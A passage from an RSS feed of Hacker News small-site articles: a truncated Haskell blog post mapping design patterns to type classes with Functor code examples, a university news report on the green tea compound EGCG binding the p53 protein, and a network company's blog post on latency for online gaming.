    <p><em>Posted on November 24, 2018
    
        by Thomas Mahler
    </em></p></div>

<p><a href="https://circleci.com/gh/thma/LtuPatternFactory"><img src="https://circleci.com/gh/thma/LtuPatternFactory.svg?style=svg" alt="CircleCI"></a></p>
<p>My first programming languages were Lisp, Scheme, and ML. When I later started to work in OO languages like C++ and Java I noticed that idioms that are standard vocabulary in functional programming (fp) were not so easy to achieve and required sophisticated structures. Books like <a href="https://en.wikipedia.org/wiki/Design_Patterns">Design Patterns: Elements of Reusable Object-Oriented Software</a> were a great starting point to reason about those structures. One of my earliest findings was that several of the GoF-Patterns had a stark resemblance of structures that are built into in functional languages: for instance the strategy pattern corresponds to higher order functions in fp (more details see <a href="#strategy">below</a>).</p>
<p>Recently, while re-reading through the <a href="https://wiki.haskell.org/Typeclassopedia">Typeclassopedia</a> I thought it would be a good exercise to map the structure of software <a href="https://en.wikipedia.org/wiki/Software_design_pattern#Classification_and_list">design-patterns</a> to the concepts found in the Haskell type class library and in functional programming in general.</p>
<p>By searching the web I found some blog entries studying specific patterns, but I did not come across any comprehensive study. As it seemed that nobody did this kind of work yet I found it worthy to spend some time on it and write down all my findings on the subject.</p>
<p>I think this kind of exposition could be helpful if you are:</p>
<ul>
<li>a programmer with an OO background who wants to get a better grip on how to implement complexer designs in functional programming</li>
<li>a functional programmer who wants to get a deeper intuition for type classes.</li>
<li>studying the <a href="https://wiki.haskell.org/Typeclassopedia">Typeclassopedia</a> and are looking for an accompanying reading providing example use cases and working code.</li>
</ul>
<blockquote>
<p>This project is work in progress, so please feel free to contact me with any corrections, adjustments, comments, suggestions and additional ideas you might have. Please use the <a href="https://github.com/thma/LtuPatternFactory/issues">Issue Tracker</a> to enter your requests.</p>
</blockquote>
<h2 id="table-of-contents">Table of contents</h2>
<ul>
<li><a href="#lambda-the-ultimate-pattern-factory">Lambda the ultimate pattern factory</a></li>
<li><a href="#the-patternopedia">The Patternopedia</a>
<ul>
<li><a href="#data-transfer-object--functor">Data Transfer Object → Functor</a></li>
<li><a href="#singleton--applicative">Singleton → Applicative</a></li>
<li><a href="#pipeline--monad">Pipeline → Monad</a></li>
<li><a href="#nullobject--maybe-monad">NullObject → Maybe Monad</a></li>
<li><a href="#interpreter--reader-monad">Interpreter → Reader Monad</a> <!--  * [? → MonadFail](#--monadfail)--></li>
<li><a href="#aspect-weaving--monad-transformers">Aspect Weaving → Monad Transformers</a> <!--* [? → MonadFix](#--monadfix) --></li>
<li><a href="#composite--semigroup--monoid">Composite → SemiGroup → Monoid</a> <!--* [? → Alternative, MonadPlus, ArrowPlus](--alternative-monadplus-arrowplus) --></li>
<li><a href="#visitor--foldable">Visitor → Foldable</a></li>
<li><a href="#iterator--traversable">Iterator → Traversable</a> <!-- * [? → Bifunctor](#--bifunctor) --></li>
<li><a href="#the-pattern-behind-the-patterns--category">The Pattern behind the Patterns → Category</a> <!--* [? → Arrow](#--arrow) --></li>
<li><a href="#fluent-api--comonad">Fluent Api → Comonad</a></li>
</ul></li>
<li><a href="#beyond-type-class-patterns">Beyond type class patterns</a>
<ul>
<li><a href="#dependency-injection--parameter-binding-partial-application">Dependency Injection → Parameter Binding, Partial Application</a></li>
<li><a href="#command--functions-as-first-class-citizens">Command → Functions as First Class Citizens</a></li>
<li><a href="#adapter--function-composition">Adapter → Function Composition</a></li>
<li><a href="#template-method--type-class-default-functions">Template Method → type class default functions</a></li>
<li><a href="#creational-patterns">Creational Patterns</a>
<ul>
<li><a href="#abstract-factory--functions-as-data-type-values">Abstract Factory → functions as data type values</a></li>
<li><a href="#builder--record-syntax-smart-constructor">Builder → record syntax, smart constructor</a></li>
</ul></li>
</ul></li>
<li><a href="#functional-programming-patterns">Functional Programming Patterns</a>
<ul>
<li><a href="#higher-order-functions">Higher Order Functions</a></li>
<li><a href="#map-reduce">Map Reduce</a> <!-- * [Continuation Passing](#continuation-passing) --></li>
<li><a href="#lazy-evaluation">Lazy Evaluation</a> <!-- * [Functional Reactive Programming](#functional-reactive-programming) --></li>
<li><a href="#reflection">Reflection</a></li>
</ul></li>
<li><a href="#conclusions">Conclusions</a></li>
<li><a href="#some-interesting-links">Some related links</a></li>
</ul>
<h2 id="the-patternopedia">The Patternopedia</h2>
<p>The <a href="https://wiki.haskell.org/wikiupload/8/85/TMR-Issue13.pdf">Typeclassopedia</a> is a now classic paper that introduces the Haskell type classes by clarifying their algebraic and category-theoretic background. In particular it explains the relationships among those type classes.</p>
<p>In this chapter I’m taking a tour through the Typeclassopedia from a design pattern perspective. For each of the Typeclassopedia type classes I try to explain how it corresponds to structures applied in software design patterns.</p>
<p>As a reference map I have included the following chart that depicts the Relationships between type classes covered in the Typeclassopedia:</p>
<figure>
<img src="https://wiki.haskell.org/wikiupload/c/c7/Typeclassopedia-diagram.svg" alt=""><figcaption>The Haskell type classes covered by the Typeclassopedia</figcaption>
</figure>
<ul>
<li>Solid arrows point from the general to the specific; that is, if there is an arrow from Foo to Bar it means that every Bar is (or should be, or can be made into) a Foo.</li>
<li>Dotted lines indicate some other sort of relationship.</li>
<li>Monad and ArrowApply are equivalent.</li>
<li>Apply and Comonad are greyed out since they are not actually (yet?) in the standard Haskell libraries ∗.</li>
</ul>
<h3 id="data-transfer-object-functor">Data Transfer Object → Functor</h3>
<blockquote>
<p>In the field of programming a data transfer object (DTO) is an object that carries data between processes. The motivation for its use is that communication between processes is usually done resorting to remote interfaces (e.g., web services), where each call is an expensive operation. Because the majority of the cost of each call is related to the round-trip time between the client and the server, one way of reducing the number of calls is to use an object (the DTO) that aggregates the data that would have been transferred by the several calls, but that is served by one call only. (quoted from <a href="https://en.wikipedia.org/wiki/Data_transfer_object">Wikipedia</a></p>
</blockquote>
<p>Data Transfer Object is a pattern from Martin Fowler’s <a href="https://martinfowler.com/eaaCatalog/dataTransferObject.html">Patterns of Enterprise Application Architecture</a>. It is typically used in multi-layered applications where data is transferred between backends and frontends.</p>
<p>The aggregation of data usually also involves a denormalization of data structures. As an example, please refer to the following diagram where two entities from the backend (<code>Album</code> and <code>Artist</code>) are assembled to a compound denormalized DTO <code>AlbumDTO</code>:</p>
<figure>
<img src="https://martinfowler.com/eaaCatalog/dtoSketch.gif" alt=""><figcaption>DTO</figcaption>
</figure>
<p>Of course, there is also an inverse mapping from <code>AlbumDTO</code> to <code>Album</code> which is not shown in this diagram.</p>
<p>In Haskell <code>Album</code>, <code>Artist</code> and <code>AlbumDTO</code> can be represented as data types with record notation:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>data</span> <span>Album</span> <span>=</span> <span>Album</span> {</span>
<span id="cb1-2"><span>    title       ::</span> <span>String</span></span>
<span id="cb1-3">  ,<span> publishDate ::</span> <span>Int</span></span>
<span id="cb1-4">  ,<span> labelName   ::</span> <span>String</span></span>
<span id="cb1-5">  ,<span> artist      ::</span> <span>Artist</span></span>
<span id="cb1-6">} <span>deriving</span> (<span>Show</span>)</span>
<span id="cb1-7"></span>
<span id="cb1-8"><span>data</span> <span>Artist</span> <span>=</span> <span>Artist</span> {</span>
<span id="cb1-9"><span>    publicName ::</span> <span>String</span></span>
<span id="cb1-10">  ,<span> realName   ::</span> <span>Maybe</span> <span>String</span></span>
<span id="cb1-11">} <span>deriving</span> (<span>Show</span>)</span>
<span id="cb1-12"></span>
<span id="cb1-13"><span>data</span> <span>AlbumDTO</span> <span>=</span> <span>AlbumDTO</span> {</span>
<span id="cb1-14"><span>    albumTitle  ::</span> <span>String</span></span>
<span id="cb1-15">  ,<span> published   ::</span> <span>Int</span></span>
<span id="cb1-16">  ,<span> label       ::</span> <span>String</span></span>
<span id="cb1-17">  ,<span> artistName  ::</span> <span>String</span></span>
<span id="cb1-18">} <span>deriving</span> (<span>Show</span>, <span>Read</span>)</span></code></pre></div>
<p>The transfer from an <code>Album</code> to an <code>AlbumDTO</code> and vice versa can be achieved by two simple functions, that perfom the intended field wise mappings:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>toAlbumDTO ::</span> <span>Album</span> <span>-&gt;</span> <span>AlbumDTO</span></span>
<span id="cb2-2">toAlbumDTO <span>Album</span> {title <span>=</span> t, publishDate <span>=</span> d, labelName <span>=</span> l, artist <span>=</span> a} <span>=</span></span>
<span id="cb2-3">  <span>AlbumDTO</span> {albumTitle <span>=</span> t, published <span>=</span> d, label <span>=</span> l, artistName <span>=</span> (publicName a)}</span>
<span id="cb2-4"></span>
<span id="cb2-5"><span>toAlbum ::</span> <span>AlbumDTO</span> <span>-&gt;</span> <span>Album</span></span>
<span id="cb2-6">toAlbum <span>AlbumDTO</span> {albumTitle <span>=</span> t, published <span>=</span> d, label <span>=</span> l, artistName <span>=</span> n} <span>=</span></span>
<span id="cb2-7">  <span>Album</span> {title <span>=</span> t, publishDate <span>=</span> d, labelName <span>=</span> l, artist <span>=</span> <span>Artist</span> {publicName <span>=</span> n, realName <span>=</span> <span>Nothing</span>}}</span></code></pre></div>
<p>In this few lines we have covered the basic idea of the DTO pattern.</p>
<p>Now, let’s consider the typical situation that you don’t have to transfer only a <em>single</em> <code>Album</code> instance but a whole list of <code>Album</code> instances, e.g.:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>albums ::</span> [<span>Album</span>]</span>
<span id="cb3-2">albums <span>=</span></span>
<span id="cb3-3">    [</span>
<span id="cb3-4">      <span>Album</span> {title <span>=</span> <span>"Microgravity"</span>,</span>
<span id="cb3-5">             publishDate <span>=</span> <span>1991</span>,</span>
<span id="cb3-6">             labelName <span>=</span> <span>"Origo Sound"</span>,</span>
<span id="cb3-7">             artist <span>=</span> <span>Artist</span> {publicName <span>=</span> <span>"Biosphere"</span>, realName <span>=</span> <span>Just</span> <span>"Geir Jenssen"</span>}}</span>
<span id="cb3-8">    , <span>Album</span> {title <span>=</span> <span>"Apollo - Atmospheres &amp; Soundtracks"</span>,</span>
<span id="cb3-9">             publishDate <span>=</span> <span>1983</span>,</span>
<span id="cb3-10">             labelName <span>=</span> <span>"Editions EG"</span>,</span>
<span id="cb3-11">             artist <span>=</span> <span>Artist</span> {publicName <span>=</span> <span>"Brian Eno"</span>, realName <span>=</span> <span>Just</span> <span>"Brian Peter George St. John le Baptiste de la Salle Eno"</span>}}</span>
<span id="cb3-12">    ]</span></code></pre></div>
<p>In this case we have to apply the <code>toAlbumDTO</code> function to all elements of the list. In Haskell this <em>higher order</em> operation is called <code>map</code>:</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>map</span><span> ::</span> (a <span>-&gt;</span> b) <span>-&gt;</span> [a] <span>-&gt;</span> [b]</span>
<span id="cb4-2"><span>map</span> _f []    <span>=</span> []</span>
<span id="cb4-3"><span>map</span> f (x<span>:</span>xs) <span>=</span> f x <span>:</span> <span>map</span> f xs</span></code></pre></div>
<p><code>map</code> takes a function <code>f :: (a -&gt; b)</code> (a function from type <code>a</code> to type <code>b</code>) and an <code>[a]</code> list and returns a <code>[b]</code> list. The <code>b</code> elements are produced by applying the function <code>f</code> to each element of the input list. Applying <code>toAlbumDTO</code> to a list of albums can thus be done in the Haskell REPL GHCi as follows:</p>
<div id="cb5"><pre><code><span id="cb5-1">λ<span>&gt;</span> <span>map</span> toAlbumDTO albums</span>
<span id="cb5-2">[<span>AlbumDTO</span> {albumTitle <span>=</span> <span>"Microgravity"</span>, published <span>=</span> <span>1991</span>, label <span>=</span> <span>"Origo Sound"</span>, artistName <span>=</span> <span>"Biosphere"</span>},</span>
<span id="cb5-3"> <span>AlbumDTO</span> {albumTitle <span>=</span> <span>"Apollo - Atmospheres &amp; Soundtracks"</span>, published <span>=</span> <span>1983</span>, label <span>=</span> <span>"Editions EG"</span>, artistName <span>=</span> <span>"Brian Eno"</span>}]</span></code></pre></div>
<p>This mapping of functions over lists is a basic technique known in many functional languages. In Haskell further generalises this technique with the concept of the <code>Functor</code> type class.</p>
<blockquote>
<p>The <code>Functor</code> class is the most basic and ubiquitous type class in the Haskell libraries. A simple intuition is that a <code>Functor</code> represents a “container” of some sort, along with the ability to apply a function uniformly to every element in the container. For example, a list is a container of elements, and we can apply a function to every element of a list, using <code>map</code>. As another example, a binary tree is also a container of elements, and it’s not hard to come up with a way to recursively apply a function to every element in a tree.</p>
<p>Another intuition is that a Functor represents some sort of “computational context”. This intuition is generally more useful, but is more difficult to explain, precisely because it is so general.</p>
<p>Quoted from <a href="https://wiki.haskell.org/Typeclassopedia#Functor">Typeclassopedia</a></p>
</blockquote>
<p>Basically, all instances of the <code>Functor</code> type class must provide a function <code>fmap</code>:</p>
<div id="cb6"><pre><code><span id="cb6-1"><span>class</span>  <span>Functor</span> f  <span>where</span></span>
<span id="cb6-2"><span>    fmap ::</span> (a <span>-&gt;</span> b) <span>-&gt;</span> f a <span>-&gt;</span> f b</span></code></pre></div>
<p>For Lists the implementation is simply the <code>map</code> function that we already have seen above:</p>
<div id="cb7"><pre><code><span id="cb7-1"><span>instance</span> <span>Functor</span> [] <span>where</span></span>
<span id="cb7-2">    <span>fmap</span> <span>=</span> <span>map</span></span></code></pre></div>
<p>Functors have interesting properties, they fulfill the two so called <em>functor laws</em>, which are part of the definition of a mathematical functor:</p>
<div id="cb8"><pre><code><span id="cb8-1"><span>fmap</span> <span>id</span> <span>=</span> <span>id</span>                        <span>-- (1)</span></span>
<span id="cb8-2"><span>fmap</span> (g <span>.</span> h) <span>=</span> (<span>fmap</span> g) <span>.</span> (<span>fmap</span> h)  <span>-- (2)</span></span></code></pre></div>
<p>The first law <code>(1)</code> states that mapping the identity function over every item in a container has no effect.</p>
<p>The second <code>(2)</code> says that mapping a composition of two functions over every item in a container is the same as first mapping one function, and then mapping the other.</p>
<p>These laws are very useful when we consider composing complex mappings from simpler operations.</p>
<p>Say we want to extend our DTO mapping functionality by also providing some kind of marshalling. For a single album instance, we can use function composition <code>(f . g) x == f (g x)</code>, which is defined in Haskell as:</p>
<div id="cb9"><pre><code><span id="cb9-1"><span>(.) ::</span> (b <span>-&gt;</span> c) <span>-&gt;</span> (a <span>-&gt;</span> b) <span>-&gt;</span> a <span>-&gt;</span> c</span>
<span id="cb9-2">(<span>.</span>) f g x <span>=</span> f (g x)</span></code></pre></div>
<p>In the following GHCi session we are using <code>(.)</code> to first convert an <code>Album</code> to its <code>AlbumDTO</code> representation and then turn that into a <code>String</code> by using the <code>show</code> function:</p>
<div id="cb10"><pre><code><span id="cb10-1">λ<span>&gt;</span> album1 <span>=</span> albums <span>!!</span> <span>0</span></span>
<span id="cb10-2">λ<span>&gt;</span> <span>print</span> album1</span>
<span id="cb10-3"><span>Album</span> {title <span>=</span> <span>"Microgravity"</span>, publishDate <span>=</span> <span>1991</span>, labelName <span>=</span> <span>"Origo Sound"</span>, artist <span>=</span> <span>Artist</span> {publicName <span>=</span> <span>"Biosphere"</span>, realName <span>=</span> <span>Just</span> <span>"Geir Jenssen"</span>}}</span>
<span id="cb10-4">λ<span>&gt;</span> marshalled <span>=</span> (<span>show</span> <span>.</span> toAlbumDTO) album1</span>
<span id="cb10-5">λ<span>&gt;</span> <span>:</span>t marshalled</span>
<span id="cb10-6"><span>marshalled ::</span> <span>String</span></span>
<span id="cb10-7">λ<span>&gt;</span> <span>print</span> marshalled</span>
<span id="cb10-8"><span>"AlbumDTO {albumTitle = \"Microgravity\", …</span></span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html">https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html</a></em></p>]]>
            </description>
            <link>https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126002</guid>
            <pubDate>Sat, 13 Feb 2021 19:29:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Antioxidant in green tea may increase levels of p53, an anti-cancer protein]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26125671">thread link</a>) | @finphil
<br/>
February 13, 2021 | https://nuadox.com/post/643030841522536448/green-tea-p53-protein | <a href="https://web.archive.org/web/*/https://nuadox.com/post/643030841522536448/green-tea-p53-protein">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="643030841522536448">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/643030841522536448/green-tea-p53-protein"><h2>Antioxidant in green tea may increase levels of p53, an anti-cancer protein</h2></a>
                                <figure data-orig-width="1280" data-orig-height="855"><img src="https://64.media.tumblr.com/f6a0a630187afd9268b0372fbcc4e09e/1ae3647e82144769-00/s1280x1920/fc9b00fcd69f86ea10d75049e36b11fb66730a5e.jpg" alt="image" data-orig-width="1280" data-orig-height="855" width="1280" height="855"></figure><p><b>- By&nbsp;<a href="https://href.li/?https://info.rpi.edu/people/mary-l-martialay">Mary L. Martialay</a> ,&nbsp;<a href="https://href.li/?https://www.rpi.edu/">Rensselaer Polytechnic Institute</a> -</b></p><p>An antioxidant found in green tea may increase levels of p53, a natural anti-cancer protein, known as the “guardian of the genome” for its ability to repair DNA damage or destroy cancerous cells.&nbsp;</p><p>Published on February 12 in <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nature.com%2Farticles%2Fs41467-021-21258-5&amp;t=YjU4YzM2ZGRhMGZiMDc1ZmNmNTE1MDM0Nzg0YzAyZTUzYzYzMzljYSxlUURrZXFETg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F643030841522536448%2Fgreen-tea-p53-protein&amp;m=0&amp;ts=1613479186"><i>Nature Communications</i>,</a> a study of the direct interaction between p53 and the green tea compound, epigallocatechin gallate (EGCG), points to a new target for cancer drug discovery.</p><p>“Both p53 and EGCG molecules are extremely interesting. Mutations in p53 are found in over 50% of human cancer, while EGCG is the major anti-oxidant in green tea, a popular beverage worldwide,” said <a href="https://href.li/?http://homepages.rpi.edu/~wangc5/index.html">Chunyu Wang</a>, corresponding author and a professor of biological sciences at <a href="https://href.li/?https://rpi.edu/">Rensselaer Polytechnic Institute</a>. “Now we find that there is a previously unknown, direct interaction between the two, which points to a new path for developing anti-cancer drugs. Our work helps to explain how EGCG is able to boost p53’s anti-cancer activity, opening the door to developing drugs with EGCG-like compounds.”</p><p>Wang, a member of the <a href="https://href.li/?https://www.youtube.com/watch?v=Hm_O0FqYSt4">Rensselaer Center for Biotechnology and Interdisciplinary Studies</a>, is an expert in using nuclear magnetic resonance spectroscopy to study <a href="https://href.li/?https://news.rpi.edu/content/2021/01/26/new-nih-grant-supports-single-molecule-study-protein-key-alzheimer-%E2%80%99s-disease">specific mechanisms in Alzheimer’s disease</a> and <a href="https://href.li/?https://news.rpi.edu/content/2017/02/27/hedgehog-cancer-and-zinc">cancer</a>, including p53, which he described as “arguably the most important protein in human cancer.”</p><p>P53 has several well-known anti-cancer functions, including halting cell growth to allow for DNA repair, activating DNA repair, and initiating programmed cell death — called apoptosis — if DNA damage cannot be repaired. One end of the protein, known as the N-terminal domain, has a flexible shape, and therefore, can potentially serve several functions depending on its interaction with multiple molecules.</p><p>EGCG is a natural antioxidant, which means it helps to undo the near constant damage caused during oxygen metabolism. Found in abundance in green tea, EGCG is also packaged as an herbal supplement.</p><p>Wang’s team found that the interaction between EGCG and p53 preserves the protein against degradation. Typically, after being produced within the body, p53 is quickly degraded when the N-terminal domain interacts with a protein called MDM2. This regular cycle of production and degradation holds p53 levels at a low constant.</p><p>“Both EGCG and MDM2 bind at the same place on p53, the N-terminal domain, so EGCG competes with MDM2,” said Wang. “When EGCG binds with p53, the protein is not being degraded through MDM2, so the level of p53 will increase with the direct interaction with EGCG, and that means there is more p53 for anti-cancer function. This is a very important interaction.”</p><p>“By developing an understanding of the molecular-level mechanisms that control key biochemical interactions linked to devastating illnesses such as cancer and Alzheimer’s disease, Chunyu’s research is laying the groundwork for new and successful therapies,” said Curt Breneman, dean of the Rensselaer School of Science.</p><p>–</p><p><b>Source:&nbsp;<a href="https://href.li/?https://news.rpi.edu/content/2021/02/12/green-tea-compound-aids-p53-guardian-genome-and-tumor-suppressor">Rensselaer Polytechnic Institute</a></b></p><p><b>Full study:</b>&nbsp;“EGCG binds intrinsically disordered N-terminal domain of p53 and disrupts p53-MDM2 interaction”, <i>Nature Communications</i>.</p><p><a href="https://href.li/?https://doi.org/10.1038/s41467-021-21258-5">https://doi.org/10.1038/s41467-021-21258-5</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/625997758414929920/synthesizing-cepafungin">Chemists efficiently synthesize natural anti-cancer compound cepafungin I</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/tea">tea</a>
                                    
                                        <a href="https://nuadox.com/tagged/green-tea">green tea</a>
                                    
                                        <a href="https://nuadox.com/tagged/cancer">cancer</a>
                                    
                                        <a href="https://nuadox.com/tagged/oncology">oncology</a>
                                    
                                        <a href="https://nuadox.com/tagged/antioxidants">antioxidants</a>
                                    
                                        <a href="https://nuadox.com/tagged/p53">p53</a>
                                    
                                        <a href="https://nuadox.com/tagged/dna">dna</a>
                                    
                                        <a href="https://nuadox.com/tagged/genetics">genetics</a>
                                    
                                        <a href="https://nuadox.com/tagged/health">health</a>
                                    
                                        <a href="https://nuadox.com/tagged/medicine">medicine</a>
                                    
                                        <a href="https://nuadox.com/tagged/egcg">egcg</a>
                                    
                                    </p>
                                </span></p>
                                
<ol><!-- START NOTES --><!-- END NOTES --></ol></div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/643030841522536448/green-tea-p53-protein</link>
            <guid isPermaLink="false">hacker-news-small-sites-26125671</guid>
            <pubDate>Sat, 13 Feb 2021 18:50:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why the Internet Today Isn’t Built for the Billions of Gamers of Tomorrow]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 7 (<a href="https://news.ycombinator.com/item?id=26124917">thread link</a>) | @quentusrex
<br/>
February 13, 2021 | https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow | <a href="https://web.archive.org/web/*/https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-4b4cde9dbdbb9767ad24"><div><p>The 2020 pandemic exposed a fundamental flaw in the way the Internet is built.</p><p>Online games were blamed for clogged networks and slowed speeds, but in reality, the Internet is structurally broken when it comes to real-time interactivity. You’ve heard the line:</p><p><strong><em>Kids, get off your consoles; I’m on a video call!</em></strong></p><p>It’s 4 PM on Wednesday. You’re on an important Zoom call and right in the middle of presenting when your face freezes. Those on the call can only catch half of what you say and are left staring at an unflattering image of you mid-word.</p><h3><strong>How We Got Here: The Evolving Internet</strong></h3><p>The Internet is built for the reliable delivery of content, such as e-mail and file transfers, but not built for performance. Border Gateway Protocol (BGP)— the standardized routing protocol for the Internet—has no idea what traffic it is routing or in which direction it is sending data. It simply routes data using the cheapest path possible depending on various factors, including politics, commercial agreements, and cost. As a result, certain types of data, namely real-time communications, suffer as the Internet favors servicing volumetric traffic.</p><p>At the start of the millennium, content delivery networks employed global networks of servers to deliver static content faster, leading the way to make OTT (Over-the-top, services offered over the top of traditional content distributors) possible with the infrastructure built by companies such as Netflix, YouTube, and Akamai. More recently, companies like Amazon Web Services have democratized cloud computing, bringing connectivity to more users in more regions of the world. The next evolution of the Internet should be one in which the network itself is democratized, enabling speed-of-light communication for the applications that require high-velocity delivery, such as real-time communications. This means delivering voice over internet protocol calls (VoIP, e.g., Skype, Clubhouse), online multiplayer video games, and more, regardless of the compute or data server owner.</p><h3><strong>Complex Issues with a Complex Network</strong></h3><p>The Internet is a complicated web of networks and billions of computers and devices that connect to each other and work together to send and receive information. The greater the distance between the sending and receiving computers, the longer it takes the data to arrive at its destination. Information can also take different paths, which may increase or decrease the speed of delivery.</p><p>A common analogy used to explain the way the Internet works is the postal service. In the same way that your letter travels from you to the recipient through multiple facilities (carrier, sorting, post office), data travels through numerous routers on its way to the recipient computer. Just as your letter can arrive faster depending on which mail service you use, so too can data transmit faster depending on which path it takes, though the distance between the sender and receiver has the most influence on travel time.</p><p>There are a couple of significant differences in this analogy, however.</p><p><em>One, there are generally more “stops” along the way for data, and two, the data is broken up into multiple smaller “packets” of information rather than sent as one whole mail piece.</em></p><p>Because there are different paths along which individual packets of information can travel, each entailing a variable number of stops along the way, packets of data can easily get lost.</p><p><strong>Packet loss</strong>, as it’s called, results in missing information and a degraded user experience. In a Skype call, packet loss is experienced as gaps in audio. In video games, packet loss results in strange behavior like teleportation, in which a game freezes, then suddenly moves a player’s character to another place when the game resumes.</p><p>Another result of these inconsistent, differing routes is variation in delivery time. Some routes are faster than others, so some packets may arrive more quickly than others since the Internet is not conscious of which path it takes in sending data from one point to another. This variation in the time it takes for data to travel across the network from one endpoint to another is called <strong>latency</strong>, and the result of latency is <strong>jitter</strong>. On a Skype call, jitter manifests as jumbled speech that creates an indecipherable conversation. In video games, jitter manifests in behavior like errant shots, in which a player’s aim may be correct, but the shot doesn’t register in time to hit the target where they are.</p><p>While <strong>lag</strong> (high levels of latency), jitter, and packet loss may impact any online service or application, certain applications depend upon real-time packet delivery and minimal jitter and packet loss to function correctly and maintain a reasonable quality of experience. Packet delivery, consistent latency, and minimal lag are critical for services and applications like VoIP and online gaming and in numerous other industries such as high-frequency trading, telemedicine, and the Internet of Things.</p><p>For these applications, milliseconds saved in delivering data can lead to a real or virtual life-and-death situation and mean the difference between winning and losing millions of dollars or between a quality and a subpar gaming experience.</p><h3><strong>How Subspace Improves Real-Time Application Delivery</strong></h3><p>A millisecond’s delay in delivery does not matter in sending an email or a text message, but it does matter in real-time communications. So why should these applications travel on the same network, in the same way?</p><p>Subspace’s vision is to create an Internet byway through which latency-critical web traffic such as video games, VoIP, and video conferencing can consistently pass through at the speed of light. Like Waze for the Internet, Subspace gives the Internet a GPS of sorts, finding the absolute fastest and most secure and consistent path for real-time data to travel from endpoint to endpoint. As a result, latency and lag are reduced, and real-time applications reach their full potential.</p><p>While other companies have attempted to provide solutions for expediting real-time communications on the Internet, none have addressed the issue across the entire system. Many introduce other issues in their attempts. Commercial networking solutions like Cisco and Juniper were not built for global coordination or to understand and control game traffic. Standalone solutions that require SDKs installed in clients and servers can create significant security and stability risks. And services provided by CDNs like Cloudflare and Akamai utilize the same principles and infrastructure as their primary businesses—that is, volumetric traffic—making the possibility of optimizing real-time traffic at scale a costly and difficult endeavor.&nbsp;</p><p>In the case of video games, lag, packet loss, and jitter are such a concern that some game companies have endeavored to build their own custom solutions. This “do it yourself” approach requires massive internal coordination, investment, and attention, which many publishers cannot afford to prioritize. And still, a DIY approach limits the publisher to its existing commercial relationships and capabilities.</p><p>Subspace’s platform optimizes every component of network performance, from the infrastructure stack to the networking stack, including software and hardware, the control plane, and the data plane. With a global Internet architected specifically for real-time traffic at every point, we are achieving speed-of-light communication and democratizing the network. Regardless of the data’s location, Subspace uses a vast system of Internet quality metrics and a proprietary algorithm to direct real-time interactive traffic onto our platform and across the public and our private Internet to and from servers. The algorithm can balance multiple variables to suit each application’s needs—variables such as absolute latency, any latency above a threshold, jitter &amp; loss. The optimal delivery platform via the Subspace onramp drives better, more consistent experiences that match each application’s needs.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1612978699676_35285"><div><p>We start with purpose-built points of presence (PoPs), deploying our hardware in data centers worldwide. Each PoP is capable of handling millions of servers, millions of simultaneous user sessions, and enough capacity for all of the user traffic while also providing room for absorbing DDOS attacks, with the expectation that traffic by its nature is mostly small UDP packets.</p><p>The PoPs are distributed globally and specifically network-engineered to reduce the distance needed for players to reach our onramp, minimizing the risk of congestion and misrouting. Players are given a Subspace IP and UDP port as a proxy for a server.</p><p>The Subspace PoP uses a proprietary algorithm to determine the optimal path through our private network before ultimately reaching the game server and back. We do this both ways, packets can take a different route back from the server if Subspace finds a better path for the application needs, another differentiator to CDNs, which are optimized for one-way traffic. Continuous telemetry measures the latency, jitter, and loss between Subspace PoPs, feeding into an algorithm that determines the optimum route between the edge and application servers. On the network’s server-side, we have PoPs directly connected with major providers to minimize latency and lag upon exiting our network.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1612978699676_41155"><div><p>Subspace’s global network, which has already launched in multiple regions and is being aggressively deployed towards a global optimized network, already supports some of the world’s most popular online games. And it’s not just about performance. The Subspace platform leverages all of these PoPs to provide a tremendous platform for stopping DDoS attacks against application servers at the edge, before bot networks can aggregate into attacks that get too big to handle or have to be sent off to latency-inducing scrubbing centers. Troublesome attack vectors, replay attacks, and other volumetric attacks can be easily stopped at the Subspace edge, while the game server infrastructure remains protected …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow">https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow</a></em></p>]]>
            </description>
            <link>https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124917</guid>
            <pubDate>Sat, 13 Feb 2021 17:22:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Algorithms for Optimization Now Open Access]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26124759">thread link</a>) | @Mageek
